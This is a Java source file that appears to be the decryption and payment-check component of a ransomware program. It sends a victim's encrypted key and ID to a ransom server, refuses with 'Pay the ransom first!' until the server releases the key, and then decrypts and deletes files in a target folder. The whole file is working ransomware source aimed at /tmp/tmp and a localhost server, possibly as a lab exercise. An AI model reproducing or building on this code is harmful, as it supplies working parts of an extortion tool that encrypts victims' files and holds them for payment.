import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.io.FileOutputStream;
import java.util.Base64;
import java.util.List;
import java.util.stream.Stream;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.util.Arrays;
import java.security.MessageDigest;
import java.io.UnsupportedEncodingException;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import java.security.spec.KeySpec;
import javax.crypto.spec.PBEKeySpec;

class secret {	
	private static byte[] key;
	private static SecretKeySpec secrets;
	private static byte[] iV;
	private static byte[] salt;
	void setKey(String myKey) throws Exception{
		MessageDigest sha = null;
		//readig salt
		FileInputStream saltFis = new FileInputStream("/tmp/tmp/salt.enc");
		salt = new byte[8];
		saltFis.read(salt);
		saltFis.close();
		FileInputStream ivFis = new FileInputStream("/tmp/tmp/iv.enc");
		iV = new byte[16];
		ivFis.read(iV);
		ivFis.close();
		SecretKeyFactory factory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1");
		KeySpec keySpec = new PBEKeySpec(myKey.toCharArray(), salt, 65536,256);
		SecretKey tmp = factory.generateSecret(keySpec);
		secrets = new SecretKeySpec(tmp.getEncoded(), "AES");
	}
	void decryptFiles(int cipherMode, String key,String inputFile,String outputFile) throws Exception{
		Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
		cipher.init(Cipher.DECRYPT_MODE, secrets,new IvParameterSpec(iV));

		byte[] textString = new byte[64];
		FileOutputStream fileOutputStream = new FileOutputStream(outputFile);
		FileInputStream fileInputStream = new FileInputStream(inputFile);
		int count;
		while((count = fileInputStream.read(textString)) != -1){
			byte[] output = cipher.update(textString, 0, count);
			if (output != null){
				fileOutputStream.write(output);
			}
		}
		byte[] output = cipher.doFinal();
		if (output != null)
			fileOutputStream.write(output);
		fileInputStream.close();
		fileOutputStream.flush();
		fileOutputStream.close();
	}
}

class RansomwareDeactivate{
	void decryptAllFiles(String key) throws Exception{
		secret sec = new secret();
		sec.setKey(key);
		List<Path> fileNames = new ArrayList<Path>();
		Stream<Path> paths = Files.walk(Paths.get("/tmp/tmp/"));
		paths.filter(Files::isRegularFile).forEach(fileNames::add);
		Path salt_path = Paths.get("/tmp/tmp/salt.enc");
		Path iv_path = Paths.get("/tmp/tmp/iv.enc");
		Path key_path = Paths.get("/tmp/tmp/key.enc");
		fileNames.remove(salt_path);
		fileNames.remove(iv_path);
		fileNames.remove(key_path);
		for(Path file:fileNames){
			try{	
				System.out.println("Decrypting file: "+file.toString());
				String inputFile = file.toString();
				String outputFile = inputFile.substring(0, inputFile.lastIndexOf('.'));
				sec.decryptFiles(Cipher.DECRYPT_MODE, key, inputFile,outputFile);
				File f = new File(inputFile);
				f.delete();
			}
			catch (Exception e){
				continue;
			}
		}
	}
}

class decrypt {
	static void activate(String ans) throws Exception{
		RansomwareDeactivate ransomware = new RansomwareDeactivate();
		ransomware.decryptAllFiles(ans);
	}

    static void validatePayment() throws Exception{
        //ID is the victim's ID
        int id = 1;
        File file = new File("/tmp/tmp/key.enc");
        String encoded_key = "";
		String modifiedKey = "";
		byte[] encKey = Files.readAllBytes(file.toPath());
		encoded_key = Base64.getEncoder().encodeToString(encKey).toString();
		modifiedKey = encoded_key.replace('+', '-');
		URL obj = new URL("http://127.0.0.1/recv.php?decrypt="+modifiedKey+"&id="+id);
		HttpURLConnection con = (HttpURLConnection) obj.openConnection();
		con.setRequestMethod("GET");
		con.addRequestProperty("Victim", "Yes");
		BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
		String inputLine;
		StringBuffer response = new StringBuffer();
		while((inputLine = in.readLine()) != null){
			response.append(inputLine);
            }
		in.close();
		String ans = response.toString();
		if(ans.equals("Pay the ransom")){
			System.out.println("Pay the ransom first!");
			System.exit(0);
			}
		else
            activate(ans);
    }

	static void cleanup() throws Exception{
		File f = new File("/tmp/tmp/key.enc");
		f.delete();
		f = new File("/tmp/tmp/iv.enc");
		f.delete();
		f = new File("/tmp/tmp/salt.enc");
		f.delete();
	}

	public static void main(String[] args) throws Exception{
		validatePayment();
		cleanup();
	}
}